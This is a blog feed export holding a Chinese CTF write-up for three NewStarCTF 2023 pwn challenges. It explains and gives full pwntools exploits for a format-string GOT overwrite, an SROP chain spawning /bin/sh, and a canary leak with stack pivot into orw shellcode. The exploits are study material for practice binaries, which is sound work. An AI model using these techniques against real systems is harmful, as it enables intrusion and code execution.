{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog • All posts by \"format string\" tag",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week3/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week3/",
            "title": "newstarctf2023_week3",
            "date_published": "2023-10-15T05:32:08.000Z",
            "content_html": "<h1 id=\"puts-or-system\"><a class=\"markdownIt-Anchor\" href=\"#puts-or-system\">#</a> puts or system?</h1>\n<p>format_string 修改 got<br>\n 存在 printf 格式化漏洞，并且有个 <code>puts(&quot;/bin/sh&quot;);</code> 。只要把 puts 的 got 表值修改为 system 函数的真实值或者 plt 值，就可以 getshell。<br>\n经调试，printf 的第 9 个参数（%8p）为0x7fffffffdc90处的值。即输入的buf的内容。由此构造payload，在对应第10个参数处写入`__libc_start_main`的got地址，利用`%9s <code>泄露其真实地址。 随后拿到</code>  system <code>的真实地址，利用</code>  fmtstr_payload` 替换 puts 的 got 表内容。其中 offset 为 8，表示第 9 个参数为字符串内容。<br>\n<img data-src=\"./1697300307145-18099e4a-e4b7-4826-948a-c9044e3dacb7.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697300269029-de9586b7-638c-498d-a780-35530e2e7d3b.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29924</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./putsorsys_pe')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./putsorsys'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me some gift?(0/1)\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    payload0 <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'What\\'s it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%9$sb'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Oh thanks,There is my gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ba'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>puts_g<span class=\"token punctuation\">:</span> sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x300</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697300731337-eaf1d9d4-06d2-4873-9f77-6b47dc2ed85c.png\" alt=\"成功getshell\"></p>\n<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<p>srop<br>\n 内核向进程发送 signal 机制后，该进程会被挂起，所有寄存器信息会被压入栈中，以及压入 signal 信息，指向 sigreturn 的系统调用地址，以上这一块成为 signal frame。然后会跳转 signal handler 中处理相应的 signal，执行完毕后会执行 sigreturn 代码。<br>\n而漏洞利用机制就是，往栈中压入伪造的 signal frame，然后在栈顶放入 sigreturn 的系统调用，便可以将所有寄存器设置为我们想要的值，包括 rip 指令寄存器。伪造 signal frame 可以利用 pwntools 的工具，可以直接设定需要的寄存器值。<br>\n在这题中，用了一个 <code>syscall</code>  的库函数来实现系统调用。因此代码中没有 syscall 汇编。而这个函数的第一个参数为系统调用号，其后的参数为正常系统调用时所用到的参数。如 <code>syscall(1,1,buf,48);</code>  相当于 <code>write(1,buf,48);</code>  的系统调用。<br>\n<img data-src=\"./1697301360023-4086385e-69d4-4b03-abde-7325fae5ed04.png\" alt=\"image.png\"><br>\n 其中伪造的 signal frame 中必须设置 rsp 的值，否则为 0。由于事先无法获取 rsp 地址和其他栈地址，且没有 <code>&quot;/bin/sh&quot;</code>  字符串，无法一次 sigreturn 实现 getshell。</p>\n<p>取一段.bss 段上可读写的地址，这里取了 <code>data=0x404100</code> 。因此在第一次栈溢出构造的 signal frame 中，调用 read 函数往 data 中继续伪造下一个 signal frame，并且 rsp 设置为 data，以继续在其中构造 payload。<br>\n因为用的 syscall 函数，所以 rdi 为系统调用号，read 的系统调用号为 0。rsi, rdx, rcx 分别为 read 的 3 个参数，为 0, data, 0x400。rip 设为 syscall 的 plt 地址。以便在执行 sigreturn 后接上 read 的系统调用。<br>\n在 signal frame 紧接的低地址处，放入 syscall 函数的 plt 地址和 rdi_ret 传参。sigreturn 对应的系统调用号为 0xf。</p>\n<p>第二个 signal frame 为 <code>execve(&quot;/bin/sh&quot;,0,0);</code>  的调用。这里把前面的 payload 补齐 0x120 字符后放入 <code>&quot;/bin/sh&quot;</code>  字符串，因此 rsi 的值应为 <code>buf+0x120</code> 。rsp 继续设为 data，防止调用 system 中途出现意外。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',25998)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b syscall')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>syscall_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0401203</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404100</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># read(0, data, 0x400)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_read</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rcx <span class=\"token operator\">=</span> <span class=\"token number\">0x400</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall_p</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'welcome to srop!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># execv(\"/bin/sh\",0,0)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rcx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall_p</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x120</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697302636618-0a0c686a-8a06-4b95-bed6-92f05f4586a7.png\" alt=\"getshell\"></p>\n<h1 id=\"orwrop\"><a class=\"markdownIt-Anchor\" href=\"#orwrop\">#</a> orw&amp;rop</h1>\n<p>orw, format_string<br>\n 开启了 canary，且开启了沙盒保护，无法运行 execve 的系统调用。<br>\n<img data-src=\"./1697306979068-64ee8366-e374-453d-9986-324c392091d9.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697307112260-42c0e67c-a4e5-42eb-9a4c-cf6c83539e77.png\" alt=\"image.png\"><br>\n 存在一段可读写执行的内存，即 0x66660000 处。因此可以在此处构造 shellcode，利用 open，read，write 三者将 flag 打印出来，为了允许栈顶的上下移动，这里取地址 <code>data = 0x66660800+0x30</code> 。<br>\n<img data-src=\"./1697307467750-b74290f4-65a4-425e-b0c4-185e6db67e54.png\" alt=\"image.png\"><br>\n 存在 printf 漏洞，可以用于泄露 canary 的值。然后利用第二个 read 实现栈溢出。<br>\n<img data-src=\"./1697307236301-ea52ed88-b628-45a2-97b1-9e411cde4bec.png\" alt=\"image.png\"><br>\n 没有可以利用的 Rop 链，所以无法手动构造 read 的参数实现往 data 处写入。因此利用栈迁移，payload 中对应栈上 rbp 处的内容设置为 data，而对应返回地址设置为主函数中 <code>read(0,buf,0x100);</code> ，即 0x40137D。其中 buf 为 rbp-0x30。因此此时执行的 read 函数会在 <code>data-0x30 = 0x66660800</code>  处写入数据。<br>\n<img data-src=\"./1697307656445-8ae8f2c3-7a8c-4a7c-a695-28eedc9487bd.png\" alt=\"image.png\"><img data-src=\"./1697307884075-1d8da5a5-eae8-4950-a2cb-d968d60b72dc.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697308574157-db202e6c-1487-44f1-8861-464f14260ae9.png\" alt=\"image.png\"><br>\n 这次写入到 0x66660800 处的数据，0x66660830 处对应 rbp，所以 0x66660838 即为返回地址。首先填充包括 canary 和 rbp 共 0x38 个字符，然后返回地址设为 0x66660840，后续接 shellcode，在该次 read 函数结束后便会执行 shellcode。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25201</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./ezorw')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b read')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>start <span class=\"token operator\">=</span> <span class=\"token number\">0x401373</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040121d</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x66660800</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Try to escape the sandbox\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p\\n'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the canary is %#x'</span><span class=\"token operator\">%</span>canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I think you can get flag now\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#rbp data rsp oldrbp</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>assem<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mov rdi, 0x66660800;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mov rsi, 0;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mov rdx, 0;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mov rax, 0x2;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mov rdi, 3;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mov rsi, 0x66660a00;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mov rdx, 0x100;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mov rax, 0;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mov rdi, 1;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mov rax, 1;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I think you can get flag now\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/flag\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token 